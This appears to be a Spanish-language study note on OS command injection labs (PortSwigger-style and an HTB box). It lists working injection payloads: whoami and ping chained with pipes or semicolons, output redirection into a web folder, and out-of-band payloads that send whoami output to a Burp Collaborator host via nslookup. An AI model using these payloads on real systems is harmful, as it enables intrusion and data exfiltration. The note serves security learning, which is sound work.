# OS command injection


# OS command injection, simple case

El caso mas simple en donde se consulta el stock se le agrega el | y el comando

```
productId=1&storeId=1|whoami

```

Otra forma de inyectar comandos HTB PhotoBoom

```
photo=tabitha-turner-8hg0xRg5QIs-unsplash.jpg&filetype=jpg&dimensions=1000x1500;ping -c 1 10.10.14.34;

```

# Blind OS command injection with time delays

En este caso se inyectan comandos en Submmit feedback se usa de nueva cuenta el pipe |

```
csrf=fTYXLcrD0AxoStj3Bo0z58nhjs22Oep5&name=Masa&email=masa%40gmail.com||ping+-c+10+127.0.0.1||&subject=abcd1234&message=Comment
```

# Blind OS command injection with output redirection

Para este laboratorio no se refleja el comanod inyectado en el email de submitt feedback sin embargo se puede redireccionar a una carpeta con 
permisos de escritura /var/wwww/images( desde donde se cargan las imagenes) si damos clic derecho en una imagen y le ponemos cargar en una pestaña
nos da image?filename=image.jpg entonces si se cargan de esa ruta podriamos hacer algo como image?filename=out.txt.

```
csrf=Kfbe6pN4ThGKonJGCUZmmSS2tzjh6CF0&name=Masa&email=masa%40gmail.com|whoami>out4.txt||&subject=abcd1234&message=Comment

```
NO olvides que si no agregas los 2 || al final no se porque pero no sirve.

# Blind OS command injection with out-of-band interaction

Para este laboratorio se utilizo el Burp colaborator Client de nueva cuenta la vulnerabilidad reside en el Submit feedback y cuando se genera un 
 DNS lookup to Burp Collaborator es cuando se resuelve el lab

```
csrf=ItkBikPD69urSsgTDkHVZmvP8g1NiQj8&name=Masa&email=masa%40gmail.com|ping woojq6yqontbtnxg748e0indw42wql.oastify.com||&subject=abcd1234&message=Comment
```

# Blind OS command injection with out-of-band data exfiltration

De este laboratorio hay varias cosas a destacar primero se recuerda que hace la herramienta nslookup. Despues se utilizan las comillas invertidas para ejecutar un comando es muy parecido a $() solo que no crea una subshell. para resolver este lab se hizo uso del Burp colaborator y ademas se usa dobel ||

> Muy práctica y fácil de usar, cuya función básica es encontrar la dirección IP de un equipo determinado o realizar una búsqueda DNS inversa (es decir, encontrar el nombre de dominio de una determinada dirección IP).


```

email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||

```












